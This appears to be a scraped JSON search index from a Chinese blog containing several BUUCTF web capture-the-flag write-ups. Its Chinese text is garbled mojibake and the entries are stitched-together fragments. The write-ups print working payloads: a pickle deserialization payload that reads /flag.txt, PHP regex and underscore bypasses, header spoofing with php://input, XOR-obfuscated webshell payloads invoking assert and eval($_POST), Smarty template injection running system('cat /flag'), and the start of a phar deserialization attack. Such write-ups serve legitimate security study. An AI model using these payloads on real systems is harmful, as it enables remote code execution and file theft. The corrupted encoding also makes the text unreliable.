ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›æˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢ä¹‹åçš„ç†è§£å°±æ˜¯ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨Pickleæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡½æ•°ä¸ºï¼š ï¼ˆ1ï¼‰pickle.dump(obj, file, [,protocol]) 1234567 å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚ å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚file:æ–‡ä»¶åç§°ã€‚protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ ï¼ˆ2ï¼‰pickle.load(file) 12345 å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚ å‚æ•°è®²è§£ï¼šfileï¼šæ–‡ä»¶åç§°ã€‚ ï¼ˆ3ï¼‰pickle.dumps(obj[, protocol]) 123456 å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚ å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ ï¼ˆ4ï¼‰pickle.loads(string) 1234567 å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚ å‚æ•°è®²è§£ï¼šstringï¼šæ–‡ä»¶åç§°ã€‚ ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç  æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼š 1å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚ é˜²å¾¡æ–¹æ³• 1231ã€ç”¨æ›´é«˜çº§çš„æ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•ï¼›2ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰ï¼Œè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°ã€‚ 0\\|1**0x04è§£é¢˜** æœ¬é¢˜ä¸­æˆ‘ä»¬ä½¿ç”¨ **reduce **æ–¹æ³• æˆ‘çš„ç†è§£æ˜¯pickleååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¦‚æœæœ‰reduceï¼Œé‚£ä¹ˆåœ¨é‡å»ºå¯¹è±¡çš„æ—¶å€™å°±ä¼šè°ƒç”¨ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨æˆ‘ä»¬ä½¿ç”¨çš„å‡½æ•°ã€‚paylaod: 1c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.","link":"/2021/04/18/buuctf12/"},{"title":"buuctf14","text":"[BSidesCF 2019]FuturellaæŸ¥çœ‹æºç å°±æœ‰flagï¼Ÿ [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–1ULiwClayf&lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST['num'])){ if($_POST['num']===$str){x echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;); ç¬¬ä¸€ååº”æ˜¯å†™è„šæœ¬çˆ†ç ´ï¼Œä½†æ˜¯æ„Ÿè§‰æ•°å­—å¤ªå¤§äº†ï¼Œå†çœ‹çœ‹å…¶ä»–åœ°æ–¹ä¹Ÿæ²¡å…¶ä»–çº¿ç´¢ä¸»è¦æ˜¯ï¼Œ for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } æ€»è§‰å¾—è¿™ä¸ªåŠ å¯†å‡½æ•°æœ‰ç‚¹æå¤´å§ï¼Ÿçœ‹çœ‹æœ‰æ— æ¼æ´ mt_randæ¼æ´ã€‚ã€‚è¿˜çœŸæœ‰==https://xz.aliyun.com/t/31https://www.anquanke.com/post/id/196831https://www.freebuf.com/sectool/205240.htmlhttps://github.com/openwall/php_mt_seedè„šæœ¬ä¸‹è½½é“¾æ¥ æ€è·¯ï¼š1.ç”±äºæˆ‘ä»¬å¾—åˆ°çš„å†…å®¹æ˜¯ç»è¿‡å¤„ç†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè¿˜åŸæ‰çŸ¥é“mt_randç”Ÿæˆäº†å•¥2.çŸ¥é“mt_randç”Ÿæˆäº†å•¥ä»¥åè·å¾—å…¶éšæœºç§å­3.è·å¾—éšæœºç§å­åœ¨è¿›è¡ŒåŠ å¯†è·å¾—å‰©ä¸‹çš„ä½æ•° str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'str2='1ULiwClayf'str3 = str1[::-1]length = len(str2)res=''for i in range(0,9): for j in range(0,62): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+'61'+' '//è¿™ä¸ªæ˜¯ä½¿ç”¨php_mt_seedè„šæœ¬çˆ†ç ´æ‰€éœ€è¦çš„æ ¼å¼ print(&quot;*&quot;*6) print(str2[i],str1[j]) breakprint(res) 27 27 0 61 56 56 0 61 47 47 0 61 8 8 0 61 22 22 0 61 38 38 0 61 11 11 0 61 0 0 0 61 24 24 0 61 è„šæœ¬ä½¿ç”¨ä»£ç : åœ¨ç›®å½•ä¸‹åˆ›å»º makeç„¶åä½¿ç”¨time ./php_mt_seed éšæœºæ•° å¤åˆ¶ç½‘é¡µç”Ÿæˆéšæœºå­—ç¬¦ä¸²ä»£ç ï¼Œæ›´æ”¹æˆ‘ä»¬çš„ç§å­ç„¶åè¾“å‡º &lt;?phpmt_srand('408372545');$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }print($str); å³å¯æ‹¿åˆ°flag [MRCTF2020]å¥—å¨ƒæŸ¥çœ‹æºç  //1st$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!');} if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo &quot;you are going to the next ~&quot;;}!--&gt; è§£æä¸€ä¸‹ å¾—åˆ°ä»¥ä¸‹å‡ ç‚¹ä¿¡æ¯:1.ä¼ å…¥æ•°æ®ä¸èƒ½æœ‰_ä¸”ä¸èƒ½æœ‰%5f2.éœ€è¦ä¼ å…¥b_u_p_tä¸”å€¼ä¸ºä¸ç­‰äº2333åˆéœ€è¦ä¹°æ»¡è¶³æ­£åˆ™åŒ¹é…å¼ä»¥23333ç»“å°¾soå¦‚ä½•ç»•è¿‡ï¼Ÿ phpçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§1.å¯»æ‰¾_çš„æ›¿ä»£å“ https://www.freebuf.com/articles/web/213359.html è¿™ç¯‡æ–‡ç« é‡Œæœ‰ï¼šå¯ä»¥æ˜¯ç”¨ä»¥ä¸Šå­—ç¬¦: 2.ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä¹Ÿæ˜¯ä»¥ä¸Šæ–‡ç«  è¯´%0aä¼šè¢«è½¬åŒ–ä¸ºç©ºï¼Œä¹Ÿå¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œäºæ˜¯: ?b+u+p+t=23333%0a å¾—åˆ°æ–°æç¤º æŸ¥çœ‹æºç  çœ‹åˆ°jsfuckæºç ï¼Œf12æ§åˆ¶å°è¿è¡Œä¸€ä¸‹ï¼Œè¯´è¦post æ‹¿åˆ°æºç  &lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!='127.0.0.1')echo &quot;Sorry,you don't have permission! Your ip is :&quot;.$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){echo &quot;Your REQUEST is:&quot;.change($_GET['file']);echo file_get_contents(change($_GET['file'])); }?&gt; çœ‹åˆ°è¯´è¿˜æ˜¯éœ€è¦ipè¿›è¡Œç»•è¿‡:ipè¯»å–æœ‰ä¸‰ç§ï¼Œä¸€ç§æ˜¯xffï¼Œä¸€ç§client-ipè¿˜æœ‰ä¸€ç§æ˜¯remote_addrè¿™é‡Œæˆ‘å°±ç”¨äº†client-ipå°±ç»•è¿‡äº† client-ip: 127.0.0.1 ä½¿ç”¨PHPä¼ªåè®®ç»•è¿‡å­—ç¬¦ä¸²ç­‰äº: ?2333=php://inputpost:todat is a happy day æ¥ä¸‹æ¥å®¡è®¡ä¸€ä¸‹fileçš„æºç ï¼Œå¦‚ä½•åŠ å¯†: &lt;?phpfunction change($v){ $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr (ord($v[$i])-$i*2); } $re = base64_encode($re); return $re;}$a='flag.php';$flag=change($a);print($flag);//function change($v){// $v = base64_decode($v);// $re = '';// for($i=0;$i&lt;strlen($v);$i++){// $re .= chr ( ord ($v[$i]) + $i*2 );// }// return $re;//}//$a='ZmpdYSZmXGI=';//$flag=change($a);//print($flag);//$a='1';//print(chr(ord($a))); ZmpdYSZmXGI= æœ€ç»ˆpayload: ?2333=php://input&amp;file=ZmpdYSZmXGI= [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(&quot;This is too Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}// ?&gt; æœ¬é¢˜ç»™äº†æºç ï¼Œä¸»è¦åœ¨äºç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œå¦‚ä½•æ„é€ ï¼Ÿé™¤äº†è¿™äº›æˆ‘ä»¬åªå‰©ä¸‹å­—ç¬¦ï¼Œæ‰€ä»¥å¦‚ä½•ç”¨å­—ç¬¦æ„é€ å‡ºå­—æ¯å‘¢ï¼ŸæŸ¥åˆ°èµ„æ–™è¯´æ˜¯åˆ©ç”¨å¼‚æˆ–æ“ä½œï¼Œå†™ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹çœ‹çœ‹éƒ½æœ‰å•¥å­—ç¬¦: import restr = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): print str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result print(&quot;\\n&quot;) æ­£åˆ™ re.findall çš„ç®€å•ç”¨æ³•ï¼ˆè¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºæ•°ç»„ï¼‰re.match(patternï¼Œstring)ï¼Œè¦åŒ¹é…çš„å†…å®¹ï¼Œä»¥åŠè¦ä»ä»€ä¹ˆé‡Œé¢åŒ¹é…re.searchï¼Œä»ä»€ä¹ˆé‡Œé¢æœç´¢è¿”å› æ„é€ ä¸€ä¸‹payload: `$GET['1']`;&lt;^{=G&gt;^{=E{^/=T\\^;=g$_='&lt;&gt;{'^'{{/';//get\\^,=p@^)=i(^@=h.^@=n;^]=f/^@=o/^\\=s/^[=t~^!=_}^-=P/^`=O~^-=S'\\(\\@.;/'^',@,)@]@'$_='\\(\\@.;/'^',@,)@]@';$_();//phpinfo() è°ƒè¯•è¿‡ç¨‹:ä½¿ç”¨pyhonè„šæœ¬è·‘å‡ºå­—æ¯ä»¥åï¼Œç›´æ¥å»å–ç„¶åæ‹¼å‡‘ï¼Œå¼‚æˆ–æ“ä½œå¯ä»¥åˆå¹¶è¿›è¡Œå¼‚æˆ–ï¼Œçœäº‹å¾ˆå¤šï¼Œæ‰“ç®—è¦æ‰§è¡Œç³»ç»Ÿå—å‘½ä»¤æ¥ç€ï¼Œä½†æ˜¯å•¥ä¹Ÿä¸æ‰§è¡Œä¸å‡ºæ¥ï¼Œå»phpinfoé‡Œé¢æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯å‘ç°æ˜¯disable_functionç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å†™shellè¿›è¡Œdisable_functionæ’ä»¶çš„æ‰§è¡Œ &lt;?php// $code=$_GET['code'];// if(strlen($code)&gt;40){// die(&quot;This is too Long.&quot;);// }// if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){// die(&quot;NO.&quot;);// } //print('~&lt;&gt;{'^'!{{/');//$_='~&lt;&gt;{'^'!{{/';//get$_='~}/~{'^'!-`-/';//print($_); eval($$_['a']);//eval($_()); //print($_GET['a']); payload: http://90a70cb7-75d4-4059-b574-c59fe13eb0a2.node3.buuoj.cn/?code=$_='~&lt;&gt;{'^'!{{/';${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_POST['a'])//è¿ç»­GETä¸¤ä¸ªå€¼ï¼Œç„¶åä½¿ç”¨assertï¼Œè¿™é‡Œç”¨ä¸äº†evalä¸çŸ¥é“ä¸ºå•¥00ï¼Œå¯èƒ½å“ªé‡Œä¸å¤ªç¬¦åˆphpçš„æ ¼å¼ï¼Œè€Œassertå¯¹è¾“å…¥è¯­å¥çš„æ ¼å¼è¦æ±‚æ²¡é‚£ä¹ˆä¸¥æ ¼ã€‚ è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œhttps://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/å‰©ä¸‹çš„åé¢å†å¥½å¥½çœ‹å§~æœ‰ä¸€è¯´ä¸€ï¼Œæ„é€ å¾—æˆ‘äººéƒ½å‚»äº†â€“PSï¼šè°ƒè¯•evalçš„æ—¶å€™å¯ä»¥ä½¿ç”¨printå…ˆè¾“å‡ºå†…å®¹ï¼Œæˆ–è€…ä½¿ç”¨phpinfo()æ‰§è¡Œï¼Œè¿™æ ·å°±å¯ä»¥å¾—çŸ¥evalåˆ°åº•èƒ½ä¸èƒ½æ­¤è¯­å¥ï¼","link":"/2021/04/24/buuctf14/"},{"title":"buuctf13","text":"[CISCN2019 åä¸œå—èµ›åŒº]Web11smartyæ¨¡æ¿æ³¨å…¥ æ›´æ”¹x-forwarded-forä¼šæœ‰ä¸åŒå›æ˜¾ï¼ŒçŒœæµ‹æ³¨å…¥ç‚¹åœ¨è¿™ï¼Œè¿›è¡Œæ³¨å…¥ï¼Œç™¾åº¦äº†ä¸€ä¸‹smartyæ¨¡æ¿ï¼Œè¯´æ˜¯å¯ä»¥è¯†åˆ«phpè¯­æ³•ï¼šå°è¯•payload: 1{system('ls')} 1{system('cat /flag')} æ²¡å•¥é—®é¢˜ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šä¹‹å‰æ•´ç†è¿‡çš„å…³äºsmartyæ¨¡æ¿æ³¨å…¥çš„è¯­å¥ç”¨ä¸äº†å› ä¸ºï¼Œï¼Œé‚£ä¸ªç‰ˆæœ¬æ¯”è¾ƒè½å 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} å°±æ˜¯è¿™ä¸ª,åŸå› ï¼š3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ å…¶ä»–è§£é¢˜è¯­å¥: 12345678910{if}æ ‡ç­¾å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼šSmartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{/if}*æ—¢ç„¶å…¨éƒ¨çš„PHPå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿå°†XFFå¤´æ”¹ä¸º{if phpinfo()}{/if}ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®æ‰§è¡Œäº†phpinfo()åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_45521281/article/details/107556915 [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropboxé¢˜ç›®æç¤ºpharï¼Œè®°å¾—æ˜¯ååºåˆ—åŒ–çš„å†…å®¹ï¼šçœ‹çœ‹æœ‰æ— æºç ï¼šæ²¡æ‰¾åˆ°ï¼Œä¸Šä¼ ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥ä¸‹è½½ï¼Œå°è¯•çœ‹çœ‹èƒ½ä¸èƒ½ä¿®æ”¹ä¸‹è½½ä½ç½®ï¼Œâ€”â€”å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œä¸‹è½½å¾—åˆ°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;&lt;title&gt;ç½‘ç›˜ç®¡ç†&lt;/title&gt;&lt;head&gt; &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;nav aria-label=&quot;breadcrumb&quot;&gt; &lt;ol class=&quot;breadcrumb&quot;&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;ç®¡ç†é¢æ¿&lt;/li&gt; &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/label&gt;&lt;/li&gt; &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;ä½ å¥½ &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt;&lt;/nav&gt;&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION['sandbox']);$a-&gt;Name();$a-&gt;Size();?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; è¿˜æœ‰ä¸€ä¸ªclass.phpï¼Œdownloa.phpä¹Ÿé€ƒä¸äº†å®¡è®¡å®¡è®¡~ çœ‹äº†ä¸€åœˆæ²¡çœ‹åˆ°ååºåˆ—åŒ–çš„å‡½æ•°ï¼Œå›å»ä»”ç»†çœ‹äº†çœ‹pharååºåˆ—åŒ– pharååºåˆ—åŒ–åŸç†phar://ä¹Ÿæ˜¯æµåŒ…è£…çš„ä¸€ç§ a stubå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx;__HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();?&gt;æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚ pharçš„æœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ demoæ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ 